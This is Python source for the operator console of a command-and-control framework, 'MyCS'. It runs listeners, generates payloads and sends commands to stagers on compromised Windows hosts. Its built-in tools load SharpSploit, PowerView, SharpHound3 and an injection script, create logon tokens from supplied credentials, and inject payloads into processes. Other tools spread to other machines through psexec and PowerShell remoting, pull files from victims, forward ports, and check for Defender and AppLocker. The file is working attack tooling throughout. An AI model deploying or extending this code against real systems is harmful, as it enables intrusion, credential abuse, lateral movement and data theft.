import socket
import struct
import threading
import queue
import uuid 
import os
import time
import payloadgen
from myconstant import myconstant_networking,myconstant,mybuildin_cmd
from localhttpserver import localhttpserver

import win32pipe, win32file, pywintypes
import codecs

import decoder
from myserver import myserver,mypayload



import readline
readline.parse_and_bind("tab: complete")



class VolcabCompleter:
    def __init__(self,volcab):
        self.volcab = volcab

    def complete(self,text,state):
        results =  [x for x in self.volcab if x.startswith(text)] + [None]
        return results[state]

def setautocomplete(words):
    completer = VolcabCompleter(words)
    readline.set_completer(completer.complete)

def removecomplete():
    readline.set_completer()

class ps_loader():
    def __init__(self):
        self.DBPATH = "PSDB\\"
        self.psfiles = [f for f in os.listdir(self.DBPATH) if os.path.isfile(os.path.join(self.DBPATH, f))]

    def load_ps(self,filename):
        if filename not in self.psfiles:
            print("No available ...")
            return

        with codecs.open(self.DBPATH + filename,"r",encoding="utf-8-sig") as f:
            all_of_it = f.read()
            return all_of_it



class mymainclass():

    def __init__(self):
        self.__t_myconstant = myconstant()
        self.__t_myserver = myserver()
        self.__t_net_constant = myconstant_networking()
        self.__t_mypayload = mypayload()
        self.__t_mybuildin = mybuildin_cmd()
        self.__t_localhttpserver = localhttpserver()

    def __cmd_list_main(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_USELISTENER + ": Go to listener settings")
        print(self.__t_myconstant.CMD_USEPIPELISTENER + ": Go to pipe listener setting")
        print(self.__t_myconstant.CMD_PAYLOAD + ": Go to payload setting")
        print(self.__t_myconstant.CMD_PIPE_INTERACTSTAGER + ": Interact with pipe stager")
        print(self.__t_myconstant.CMD_INTERACTSTAGER + ": Interact with live stager")
        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
        print(self.__t_myconstant.CMD_EXIT + ": Exit the app")
        print("+++++++++++++++++++++++++++++++++++\n")

    def __cmd_list_listener(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_LISTENER_GETINFO + ": Print info of current listener setting")
        print(self.__t_myconstant.CMD_LISTENER_SETHOSTNAME + ": Set hostname")
        print(self.__t_myconstant.CMD_LISTENER_SETPORT + ": Set port number")
        print(self.__t_myconstant.CMD_LISTENER_LIST + ": Get a list of running listener")
        print(self.__t_myconstant.CMD_LISTENER_START + ": Start Listener using info")
        print(self.__t_myconstant.CMD_LISTENER_STOP + ": Stop a listener")
        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
        print(self.__t_myconstant.CMD_BACK + ": Go back to main menu")
        print("+++++++++++++++++++++++++++++++++++\n")

    def __cmd_list_stager(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST + ": Get a list of running stager")
        print(self.__t_myconstant.CMD_STAGER_GET_LIST + ": Get full list of stager")
        print(self.__t_myconstant.CMD_STAGER_GET_HISTORY + ": Get history of stager message")
        print(self.__t_myconstant.CMD_STAGER_GET_INTO + ": Send cmd to stager")
        print(self.__t_myconstant.CMD_STAGER_BUILDIN + ": Buildin tools")
        print("+++++++++++++++++++++++++++++++++++\n")
    
    def __cmd_list_payload(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_PAYLOAD_GEN + ": Start payload generation")
        print(self.__t_myconstant.CMD_PAYLOAD_SETCONFIG + ": Set payload config")
        print(self.__t_myconstant.CMD_PAYLOAD_INFO + ": Show current info")
        print(self.__t_myconstant.CMD_PAYLOAD_GTOJS + ": Use gtojs to generate special payloads (hta/vbs/vba/js)")
        print("+++++++++++++++++++++++++++++++++++\n")


    def main(self):
        
        #init
        cmd_tag = self.__t_myconstant.TAG_MYCS

        print("Hello To MyCS ...")
        
        self.__cmd_list_main()
        

        to_exit = False
        while (not to_exit):

            if cmd_tag == self.__t_myconstant.TAG_MYCS:
                setautocomplete(self.__t_myconstant.CMD_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_LISTENER:
                setautocomplete(self.__t_myconstant.CMD_LISTENER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:
                setautocomplete(self.__t_myconstant.CMD_STAGER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                setautocomplete(self.__t_myconstant.CMD_PIPE_LISTENER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_PIPE_INTE_STAGER:
                setautocomplete(self.__t_myconstant.CMD_PIPE_SAGER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_PAYLOAD:
                setautocomplete(self.__t_myconstant.CMD_PAYLOAD_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_STAGER_TOOLS:
                setautocomplete(self.__t_myconstant.CMD_STAGER_TOOLS_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_LOCALSERVER:
                setautocomplete(self.__t_myconstant.CMD_LOCALSERVER_AUTOLIST)
            

            user_input = input(cmd_tag + "> ")
            command_id = user_input
            
            if cmd_tag == self.__t_myconstant.TAG_MYCS: #Main menu
                
                # menu switch
                if command_id == self.__t_myconstant.CMD_USELISTENER:
                    cmd_tag = self.__t_myconstant.TAG_LISTENER
                    continue

                if command_id == self.__t_myconstant.CMD_USEPIPELISTENER:
                    cmd_tag = self.__t_myconstant.TAG_PIPE_LISTENER
                    continue

                if command_id == self.__t_myconstant.CMD_PIPE_INTERACTSTAGER:
                    cmd_tag = self.__t_myconstant.TAG_PIPE_INTE_STAGER
                    continue
                
                if command_id == self.__t_myconstant.CMD_INTERACTSTAGER:
                    cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
                    continue
                
                if command_id == self.__t_myconstant.CMD_PAYLOAD:
                    cmd_tag = self.__t_myconstant.TAG_PAYLOAD
                    continue

                if command_id == self.__t_myconstant.CND_LOCALSERVER:
                    cmd_tag = self.__t_myconstant.TAG_LOCALSERVER
                    continue

                # main menu
                if command_id == self.__t_myconstant.CMD_EXIT:
                    print("Thanks for using MyCS..")
                    exit()
                
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_main()
                    continue
            
            if cmd_tag == self.__t_myconstant.TAG_LISTENER: # Listener menu

                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                
                # listener menu
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_listener()
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_GETINFO:
                    self.__t_myserver.print_info()
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_SETHOSTNAME:
                    user_input = input("Please enter the hostname to listen on: ")
                    self.__t_myserver.set_hostname(user_input)
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_SETPORT:
                    user_input = input("Please enter the port number to listen on: ")
                    self.__t_myserver.set_portnumber(int(user_input))
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_LIST:
                    self.__t_myserver.print_listener()
                
                if command_id == self.__t_myconstant.CMD_LISTENER_START:
                    threading.Thread(target=self.__t_myserver.start_listener).start()
                    continue
                
                if command_id == self.__t_myconstant.CMD_LISTENER_STOP:
                    #set auto compete to listener uuid
                    setautocomplete(self.__t_myserver.get_listener())

                    user_input_listener = input("Please enter the listener uuid: ")
                    if user_input_listener not in self.__t_myserver.get_listener():
                        print("Please input a valid listener uuid")
                        continue
                    self.__t_myserver.stop_listener(user_input_listener)
                    continue
            
            if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:

                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_BUILDIN:
                    cmd_tag = self.__t_myconstant.TAG_STAGER_TOOLS
                    continue

                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_stager()
                    continue

                # stager inte menu
                if command_id == self.__t_myconstant.CMD_STAGER_GET_LIST:
                    self.__t_myserver.print_stager()
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST:
                    self.__t_myserver.print_stager_running()
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_GET_HISTORY:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue
                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
                        print(each_msg)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_GET_INTO:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    #unset auto complete
                    removecomplete()
                    user_input_command_tag = input("Please enter the command tag: ")
                    user_input_command = input("Please enter the command: ")
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue
                    self.__t_myserver.create_command(user_input_stager,user_input_command_tag,user_input_command)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_LOAD_PS:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    t_psloader = ps_loader()
                    #set auto compete for filename
                    setautocomplete(t_psloader.psfiles)
                    user_input_psfile = input("Please enter psfile to load: ")
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue

                    if (user_input_psfile not in self.__t_myserver.get_psloadlist(user_input_stager)):

                        t_result = t_psloader.load_ps(user_input_psfile)
                        #call psrun with tag psload
                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                        #update the list
                        self.__t_myserver.add_psloadlist(user_input_stager,user_input_psfile)
                    else:
                        print("{} is already loaded".format(user_input_psfile))
                
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_VERBOSE:
                    print("Current verbose setting is {}".format(self.__t_myserver.get_verbose()))
                    user_input_confirm = input("y to toggle: ")
                    if user_input_confirm != "y":
                        continue
                    self.__t_myserver.set_verbose(not self.__t_myserver.get_verbose())
                
                if command_id == self.__t_myconstant.CMD_STAGER_CON:
                    #unset auto complete
                    removecomplete()
                    #get host and port
                    user_input_host = input("Please enter target ip: ")
                    user_input_port = input("Please enter target port: ")
                    self.__t_myserver.start_client(user_input_host,int(user_input_port))
                    continue

                if command_id ==  self.__t_myconstant.CMD_STAGER_PFW:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    #unset auto complete
                    removecomplete()
                    #get host and port
                    user_input_listener_host = input("Please enter remote listener ip: ")
                    user_input_listener_port = input("Please enter remote listener port: ")
                    user_input_con_host = input("Please enter local connect ip: ")
                    user_input_con_port = input("Please enter local connect port: ")
                    # wait local resource handler return true
                    #threading.Thread(target=self.__t_myserver.start_resource_handler,args=(user_input_stager,user_input_con_host,int(user_input_con_port),)).start()
                    #pull the response
                    #t_response = self.__t_myserver.get_resource_handler_result(user_input_stager)
                    #if t_response == self.__t_net_constant.FW_LOCAL_SUCCESS:
                    rhuuid = self.__t_myserver.add_rh_info(user_input_con_host,user_input_con_port)

                    self.__t_myserver.create_command(user_input_stager,"fw","{}:{}:{}".format(rhuuid,user_input_listener_host,user_input_listener_port))
                    threading.Thread(target=self.__t_myserver.start_resource_handler,args=(user_input_stager,rhuuid)).start()
                    
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_PFW_STOP:
                    setautocomplete(self.__t_myserver.get_running_rh_list())
                    user_input_rh = input("Please enter the rh uuid: ")
                    if user_input_rh not in self.__t_myserver.get_running_rh_list():
                        print("Please input a valid rh uuid")
                        continue
                    self.__t_myserver.stop_resource_handler(user_input_rh)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_PFW_SP:
                    
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    removecomplete()
                    print("============Empty inputs will be ignored=============")
                    user_input_updatesp = input("Please enter update speed: ")
                    user_input_acksp = input("Please enter ack speed: ")
                    user_input_socksp = input("Please enter native socket timeout: ")
                    user_input_confirm = input("y to confirm: ")
                    if user_input_confirm != "y":
                        continue

                    self.__t_myserver.set_pfw_sp(user_input_updatesp,user_input_acksp,user_input_socksp)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_FWC:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue
                    removecomplete()
                    print("============Empty inputs will be ignored=============")
                    user_input_listener_host = input("Please enter local listener ip: ")
                    user_input_listener_port = input("Please enter local listener port: ")
                    user_input_con_host = input("Please enter remote connect ip: ")
                    user_input_con_port = input("Please enter remote connect port: ")
                    user_input_confirm = input("y to confirm: ")
                    if user_input_confirm != "y":
                        continue
                    rhuuid = self.__t_myserver.add_rh_info(user_input_listener_host,user_input_listener_port)

                    self.__t_myserver.create_command(user_input_stager,"fwc","{}:{}:{}".format(rhuuid,user_input_con_host,user_input_con_port))
                    threading.Thread(target=self.__t_myserver.start_resource_handler,args=(user_input_stager,rhuuid)).start()



            if cmd_tag == self.__t_myconstant.TAG_STAGER_TOOLS:
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSEXEC:
                    #re-generate payload 
                    t_mypayloadgen = payloadgen.mypayloadgen()
                    if self.__t_mypayload.payloadtype == "socket":
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
                    else:
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
                    t_mypayloadgen.gen_ps1()
                    t_mypayloadgen.gen_psexec()

                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    t_psloader = ps_loader()
                    t_result = t_psloader.load_ps("Invoke-psexec.ps1")
                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)

                    removecomplete()
                    user_input_target = input("Please enter hostname to jump to: ")
                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-psexec \"stop \\\\{}\"".format(user_input_target))
                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-psexec \"start \\\\{}\"".format(user_input_target))
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_IF64BIT:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.IF64BIT)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETNETVERSION:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETNETVERSION)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETNETVERSION2:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETNETVERSION2)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETPID:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPID)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETPSTREE:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    if ("Get-ProcessTree.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                        t_psloader = ps_loader()
                        t_result = t_psloader.load_ps("Get-ProcessTree.ps1")
                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                        #update the list
                        self.__t_myserver.add_psloadlist(user_input_stager,"Get-ProcessTree.ps1")

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETPSTREE2:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    if ("Get-ProcessTree.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                        t_psloader = ps_loader()
                        t_result = t_psloader.load_ps("Get-ProcessTree.ps1")
                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                        #update the list
                        self.__t_myserver.add_psloadlist(user_input_stager,"Get-ProcessTree.ps1")

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE2)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETCLM:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETLANGMODE)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETAV:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETDEFENDER)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETAL:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETAPPLOCKER)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_MAKETOKEN:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue
                    
                    if ("Invoke-SharpSploit.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):

                        #load ps
                        t_psloader = ps_loader()
                        t_result = t_psloader.load_ps("Invoke-SharpSploit.ps1")
                        #call psrun with tag psload
                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                        #update the list
                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-SharpSploit.ps1")
                    
                    else:
                        print("SharpSploit already loaded")

                    user_input_domain = input("Please enter target domain: ")
                    user_input_username = input("Please enter username: ")
                    user_input_password = input("Please enter password: ")
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_INIT)
                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_NEWTOKEN.format(user_input_username,user_input_domain,user_input_password))
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSRESET:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue
                    self.__t_myserver.create_command(user_input_stager,"psreset","dummy")
                    self.__t_myserver.clean_psloadlist(user_input_stager)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_INJECT:
                    
                    #re-generate payload 
                    t_mypayloadgen = payloadgen.mypayloadgen()
                    if self.__t_mypayload.payloadtype == "socket":
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
                    else:
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
                    t_mypayloadgen.gen_ps1()
                    t_mypayloadgen.gen_inject()

                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue
                    
                    if ("Invoke-inject.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):

                        t_psloader = ps_loader()
                        t_result = t_psloader.load_ps("Invoke-inject.ps1")
                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-inject.ps1")
                    else:
                        print("Inject already loaded")

                    removecomplete()
                    user_input_target = input("Please enter pid to inject into: ")
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-inject \"{}\"".format(user_input_target))
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_SHARPHOUND3:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue
                    
                    if ("Invoke-Sharphound3.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                        t_psloader = ps_loader()
                        t_result = t_psloader.load_ps("Invoke-Sharphound3.ps1")
                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Sharphound3.ps1")
                    else:
                        print("Sharphound3 already loaded")
                    
                    removecomplete()
                    user_input_domain = input("Please enter the targer domain: ")
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.SHARPHOUND3.format(user_input_domain))
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_GET_HISTORY:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue
                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
                        print(each_msg)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETDOMAIN:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue
                    
                    if ("PowerView.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                        t_psloader = ps_loader()
                        t_result = t_psloader.load_ps("PowerView.ps1")
                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                        #update the list
                        self.__t_myserver.add_psloadlist(user_input_stager,"PowerView.ps1")

                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETDOMAIN)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_LS:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps","ls")
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_CD:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue
                    
                    removecomplete()
                    user_input_path = input("Please enter the path: ")
                    #print("Moving to {}".format(user_input_path))
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue

                    self.__t_myserver.create_command(user_input_stager,"ps","cd {}".format(user_input_path))
                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.NET_CD)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_DOWNLOAD:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    removecomplete()
                    user_input_path = input("Please enter the full path: ")
                    #print("Moving to {}".format(user_input_path))
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue

                    self.__t_myserver.create_command(user_input_stager,"download",user_input_path)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSREMOTE:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    removecomplete()
                    user_input_target = input("Please enter hostname: ")
                    #print("Moving to {}".format(user_input_path))
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue

                    self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
                    self.__t_myserver.clean_psloadlist(user_input_stager)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSJUMP:
                    #re-generate payload 
                    t_mypayloadgen = payloadgen.mypayloadgen()
                    if self.__t_mypayload.payloadtype == "socket":
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
                    else:
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
                    t_mypayloadgen.gen_ps1()
                    
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    removecomplete()
                    user_input_target = input("Please enter hostname: ")
                    #print("Moving to {}".format(user_input_path))
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue

                    self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
                    self.__t_myserver.clean_psloadlist(user_input_stager)

                    t_psloader = ps_loader() #right after reset, no need to check list
                    t_result = t_psloader.load_ps("Invoke-myclient.ps1")
                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                    self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-myclient.ps1")
                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_SPAWN_PS:
                    #re-generate payload 
                    t_mypayloadgen = payloadgen.mypayloadgen()
                    if self.__t_mypayload.payloadtype == "socket":
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
                    else:
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
                    t_mypayloadgen.gen_ps1()
                    
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_stager():
                        print("Please input a valid stager uuid")
                        continue

                    if ("Invoke-myclient.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                        t_psloader = ps_loader()
                        t_result = t_psloader.load_ps("Invoke-myclient.ps1")
                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-myclient.ps1")
                    else:
                        print("Payload already loaded")
                    
                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
